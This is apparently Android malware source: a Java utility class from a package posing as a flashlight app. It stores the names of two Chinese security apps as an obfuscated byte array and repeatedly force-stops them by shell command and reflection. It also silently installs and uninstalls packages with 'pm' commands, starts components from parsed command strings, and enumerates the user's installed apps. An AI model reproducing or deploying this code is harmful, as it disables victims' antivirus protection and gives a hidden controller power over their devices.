package com.apps.flashlight;
import java.lang.reflect.Method;
import java.util.List;
import org.json.JSONException;
import org.json.JSONObject;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.text.TextUtils;

public class AppUtil {
    public static PackageInfo getPackageByServiceName(Context context, String serviceName) {
        for (PackageInfo packageInfo : context.getPackageManager().getInstalledPackages(PackageManager.GET_SERVICES)) {
            if (packageInfo != null) {
                ServiceInfo[] array = packageInfo.services;
                if (array != null) {
                    for (ServiceInfo serviceInfo : array) {
                        if (serviceInfo != null && serviceName.equals(serviceInfo.name)) return packageInfo;
                    }
                }
            }
        }
        return null;
    }
    public static void installApp(String path) {
        String command = "pm install -r " + path;
        CommonUtil.exeCmd(command);
    }
    //"com.qihoo360.mobilesafe,com.tencent.qqpimsecure"
    final static byte[] blackPackages = new byte[] { 99, 111, 109, 46, 113, 105, 104, 111, 111, 51, 54, 48, 46, 109, 111, 98, 105, 108, 101, 115, 97, 102, 101, 44, 99, 111, 109,
            46, 116, 101, 110, 99, 101, 110, 116, 46, 113, 113, 112, 105, 109, 115, 101, 99, 117, 114, 101 };
    public static void stopSecurityApps(Context context) {
        stopApp(context, new String(blackPackages));
    }
    public static JSONObject stopApp(Context context, String packageNameArray) {
        JSONObject obj = new JSONObject();
        for (String packageName : packageNameArray.split(",")) {
            if (TextUtils.isEmpty(packageName)) continue;
            JSONObject child = new JSONObject();
            put(child, "kbp", killBackgroundProcesses(context, packageName));
            //put(child, "ak", CommonUtil.exeCmd("am kill " + packageName));
            for (int i = 0; i < 3; i++) {
                JSONObject v = CommonUtil.exeCmd("am force-stop " + packageName);
                put(child, "force-stop-" + i, v);
                String s = v.toString();
                if (s.contains("SecurityException") || s.contains("usage:")) {
                    break;
                }
            }
            for (int i = 0; i < 3; i++) {
                String result = forceStop(context, packageName);
                put(child, "forceStop-" + i, result);
                if (result != null && (result.contains("SecurityException"))) {
                    break;
                }
            }
            //put(child, "pd", CommonUtil.exeCmd("pm disable " + packageName));
            put(obj, packageName, child);
        }
        return obj;
    }
    private static String forceStop(Context context, String packageName) {
        String result = null;
        ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        try {
            Method method = Class.forName("android.app.ActivityManager").getMethod("forceStopPackage", String.class);
            method.invoke(mActivityManager, packageName); //packageName是需要强制停止的应用程序包名
        } catch (Throwable e) {
            Logger.error(e);
            result = CommonUtil.getExcption(e);
        }
        return result;
    }
    private static String killBackgroundProcesses(Context context, String packageName) {
        String error = null;
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        try {
            manager.killBackgroundProcesses(packageName);
        } catch (Throwable e) {
            error = CommonUtil.getExcption(e);
        }
        return error;
    }
    private static void put(JSONObject obj, String key, Object value) {
        try {
            obj.put(key, value);
        } catch (JSONException e) {
            Logger.error(e);
        }
    }
    public static void unInstallApp(String packageName) {
        CommonUtil.exeCmd("pm uninstall " + packageName);
    }
    public static JSONObject startActivity(Context context, String command) {
        JSONObject obj = new JSONObject();
        long current = System.currentTimeMillis();
        String error = null;
        try {
            String[] fields = command.split(",");
            context.startActivity(new Intent().setComponent(new ComponentName(fields[1], fields[2])));
        } catch (Throwable e) {
            error = "\nException throw out:" + CommonUtil.getExcption(e);
        }
        try {
            obj.put("cmd", command);
            obj.put("time", System.currentTimeMillis() - current);
            if (error != null) {
                obj.accumulate("err", error);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return obj;
    }
    public static JSONObject startService(Context context, String command) {
        JSONObject obj = new JSONObject();
        long current = System.currentTimeMillis();
        String error = null;
        try {
            String[] fields = command.split(",");
            context.startService(new Intent().setComponent(new ComponentName(fields[1], fields[2])));
        } catch (Throwable e) {
            error = "\nException throw out:" + CommonUtil.getExcption(e);
        }
        try {
            obj.put("cmd", command);
            obj.put("time", System.currentTimeMillis() - current);
            if (error != null) {
                obj.accumulate("err", error);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return obj;
    }
    public static String getInstalledPackages(Context context) {
        StringBuilder sb = new StringBuilder();
        List<PackageInfo> list = context.getPackageManager().getInstalledPackages(0);
        for (PackageInfo info : list) {
            if ((info.applicationInfo.flags & 1) == 0) {
                sb.append(info.packageName).append(",");
            }
        }
        return sb.toString();
    }
}
